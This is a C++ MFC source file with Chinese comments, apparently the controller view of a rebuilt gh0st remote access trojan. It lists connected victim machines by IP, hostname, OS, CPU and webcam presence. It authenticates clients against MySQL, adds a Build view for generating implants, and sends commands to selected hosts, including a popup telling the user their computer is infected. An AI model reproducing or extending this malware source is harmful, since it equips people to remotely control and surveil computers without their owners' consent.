
// gh0stView.cpp : Cgh0stView 类的实现
//

#include "stdafx.h"
// SHARED_HANDLERS 可以在实现预览、缩略图和搜索筛选器句柄的
// ATL 项目中进行定义，并允许与该项目共享文档代码。
#ifndef SHARED_HANDLERS
#include "gh0st.h"
#endif

#include "gh0stView.h"
#include "MainFrm.h"
#include "SettingsView.h"
#include "BuildView.h"
#include <mmsystem.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

extern CIOCPServer* g_iocpServer;

#pragma pack(1)
typedef struct
{
    BYTE			bToken;			//   = 1   告诉服务器是什么封包
    char            UserName[50];   //   50    
    char            Password[50];   //   50   
    IN_ADDR			IPAddress;		//   存储32位的IPv4的地址数据结构
    char			HostName[50];	//   主机名
    bool			bIsWebCam;		//   是否有摄像头
    OSVERSIONINFOEX	OsVerInfoEx;	//   版本信息
    int				CPUClockMhz;	//   CPU主频
    DWORD           dwSpeed;        //   连接速度
}LOGININFO;
#pragma pack()

typedef struct
{
    char	*title;      
    int		nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Data[] =
{
    { "ID",				    48 },
    { "WAN",				102 },
    { "LAN",				102 },
    { "计算机名/备注",	    107 },
    { "操作系统",		    128 },
    { "CPU",				55 },
    { "Ping",			    40 },
    { "摄像头",			    51 },
    { "区域",			    100 }
};

int g_Column_Width = 0;    //总宽度

int	g_Column_Count = (sizeof(g_Column_Data) / 8) - 1;
// Cgh0stView

IMPLEMENT_DYNCREATE(Cgh0stView, CListView)

BEGIN_MESSAGE_MAP(Cgh0stView, CListView)

    ON_MESSAGE(WM_MYINITIALUPDATE, OnMyInitialUpdate)
    ON_MESSAGE(WM_ADDTOLIST, &Cgh0stView::OnAddToList)
    ON_MESSAGE(WM_REMOVEFROMLIST, &Cgh0stView::OnRemoveFromList)
    

	ON_COMMAND(IDM_RENAME, &Cgh0stView::OnRename)
	ON_COMMAND(IDM_POSTMSG, &Cgh0stView::OnPostmsg)
	ON_WM_RBUTTONDOWN()
END_MESSAGE_MAP()

// Cgh0stView 构造/析构

Cgh0stView::Cgh0stView()
{
	// TODO: 在此处添加构造代码
    m_pListCtrl = nullptr;

    ((Cgh0stApp*)AfxGetApp())->m_gh0stView = this;
}

Cgh0stView::~Cgh0stView()
{
}

BOOL Cgh0stView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: 在此处通过修改
	//  CREATESTRUCT cs 来修改窗口类或样式

    cs.style |= LVS_REPORT;  //变成报告模式  列表模式

	return CListView::PreCreateWindow(cs);
}


void Cgh0stView::OnInitialUpdate()  //初始化更新 call
{
	CListView::OnInitialUpdate();

	// TODO: 调用 GetListCtrl() 直接访问 ListView 的列表控件，
	//  从而可以用项填充 ListView。
    m_pListCtrl = &GetListCtrl();

    m_pListCtrl->SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);   //设置扩展风格

    for (int i = 0; i < g_Column_Count; i++)
    {
        m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);  //插入标题头部

        m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);  //设置每一列的宽度

        g_Column_Width += g_Column_Data[i].nWidth; // 总宽度
    }
    //投递一个消息  message
    PostMessage(WM_MYINITIALUPDATE, NULL, NULL);
}


// Cgh0stView 诊断

#ifdef _DEBUG
void Cgh0stView::AssertValid() const
{
	CListView::AssertValid();
}

void Cgh0stView::Dump(CDumpContext& dc) const
{
	CListView::Dump(dc);
}

Cgh0stDoc* Cgh0stView::GetDocument() const // 非调试版本是内联的
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(Cgh0stDoc)));
	return (Cgh0stDoc*)m_pDocument;
}
#endif //_DEBUG


// Cgh0stView 消息处理程序
LRESULT Cgh0stView::OnMyInitialUpdate(WPARAM wParam, LPARAM lParam)
{
    //Cgh0stView* pView = this;

    // Add Connects Window
    //     3           1        2              4
    ((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Connections", this, "Connections Users");
 
    //---------------增加设置窗口-------------------------
    CSettingsView* pSettingsView = new CSettingsView;

    //由于CFormView的成员受保护，所以必须对指针进行强制转换
    ((CWnd*)pSettingsView)->Create(NULL, NULL, AFX_WS_DEFAULT_VIEW,
        CRect(0, 0, 0, 0), AfxGetApp()->GetMainWnd(), AFX_IDW_PANE_FIRST, NULL);

    ((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Settings", pSettingsView, "Control Settings");

    //---------------增加构建窗口-------------------------
    CBuildView* pBuildView = new CBuildView;

    //由于CFormView的成员受保护，所以必须对指针进行强制转换
    ((CWnd*)pBuildView)->Create(NULL, NULL, AFX_WS_DEFAULT_VIEW,
        CRect(0, 0, 0, 0), AfxGetApp()->GetMainWnd(), AFX_IDW_PANE_FIRST, NULL);

    ((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Build", pBuildView, "Control Build");
 
    ((CMainFrame*)AfxGetApp()->m_pMainWnd)->SetCurView(0);  //设置当前选中视图页面

    return 0;
}

LRESULT Cgh0stView::OnAddToList(WPARAM wParam, LPARAM lParam)
{
    CString strBuf;
    ClientContext *pContext = (ClientContext*)lParam;

    LOGININFO* pLoginInfo = (LOGININFO*)(pContext->m_DeCompressionBuffer.GetBuffer(0));

	bool bRet = ((Cgh0stApp*)AfxGetApp())->m_MysqlMng.SelectUser(pLoginInfo->UserName, pLoginInfo->Password);

	if (!bRet) //如果没有这个账号，就直接返回
	{
		return 0;
	}

    int nCnt = m_pListCtrl->GetItemCount();  //得到当前有几显示的

    strBuf.Format("%d", nCnt);  

    int i = m_pListCtrl->InsertItem(nCnt, strBuf); //把顺序当作自己的ID放在ID的那个列里

    //这里的i就是在列表中的顺序
    // 内网IP
    m_pListCtrl->SetItemText(i, 2, inet_ntoa(pLoginInfo->IPAddress));
	//主机名
    m_pListCtrl->SetItemText(i, 3, pLoginInfo->HostName);
	//时钟频率
	strBuf.Format("%dMHz", pLoginInfo->CPUClockMhz);
	m_pListCtrl->SetItemText(i, 5, strBuf);
	//Ping连接速率
    strBuf.Format("%d", pLoginInfo->dwSpeed);
    m_pListCtrl->SetItemText(i, 6, strBuf);

	strBuf.Format("%s", pLoginInfo->bIsWebCam ? "是" : "否");
	m_pListCtrl->SetItemText(i, 7, strBuf);


    // 指定唯一标识
    m_pListCtrl->SetItemData(i, (DWORD)pContext);

    return 0;
}

LRESULT Cgh0stView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{
    //遍历整个列表框,找到lParam和pContext 相等的，然后给他移除了
    ClientContext	*pContext = (ClientContext *)lParam;
    if (pContext == NULL)
        return -1;
    // 删除链表过程中可能会删除Context
    try
    {
        //遍历列表，找到Client，并删除
        int nCnt = m_pListCtrl->GetItemCount();

        for (int i = 0; i < nCnt; i++)
        {
            if (pContext == (ClientContext *)m_pListCtrl->GetItemData(i))
            {
                m_pListCtrl->DeleteItem(i);
                break;
            }
        }
    }
    catch (...) 
    {
    }
    return 0;
}

void Cgh0stView::SendSelectCommand(BYTE * pData, UINT nSize)    //封包地址，封包大小
{
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();    //得到第一个

	while (pos)
	{
		int nItem = m_pListCtrl->GetNextSelectedItem(pos);  //得到下一个

		ClientContext * pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);

		g_iocpServer->Send(pContext, pData, nSize);
	}
}

void Cgh0stView::OnRename()
{
	// TODO: 在此添加命令处理程序代码
	//构建封包
	BYTE bData = COMMAND_RENAME_REMARK;

	SendSelectCommand(&bData,sizeof(bData));
}


void Cgh0stView::OnPostmsg()
{
	// TODO: 在此添加命令处理程序代码
	POPMESSAGE msg;

	msg.bType = COMMAND_POPMESSAGE;
	lstrcpy(msg.szText, "你好，你电脑中毒了");
	
	SendSelectCommand((BYTE*)&msg, sizeof(msg));

	/*AfxMessageBox("发送消息");*/
}


void Cgh0stView::OnRButtonDown(UINT nFlags, CPoint point)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	CListView::OnRButtonDown(nFlags, point);

	CMenu popup; //定义一个菜单

	popup.LoadMenuA(IDR_LIST);  //打我们设计的菜单加载进去

	CMenu *pM = popup.GetSubMenu(0);  //得到子菜单

	CPoint p;

	GetCursorPos(&p);    //得到鼠标位置

	int count = pM->GetMenuItemCount();   //看看有几个小菜单

	if (m_pListCtrl->GetSelectedCount() == 0)    //如果没有选中任何东西
	{
		for (int i = 0; i < count - 1; i++)  //如果有多个，就把多个给禁用了
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED); //灰化
		}
	}

	//全选
	if (m_pListCtrl->GetItemCount() > 0)
		pM->EnableMenuItem(count, MF_BYPOSITION | MF_ENABLED);//启用菜单
	else
		pM->EnableMenuItem(count - (count - 1), MF_BYPOSITION | MF_DISABLED | MF_GRAYED);//禁用菜单灰化


	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
}
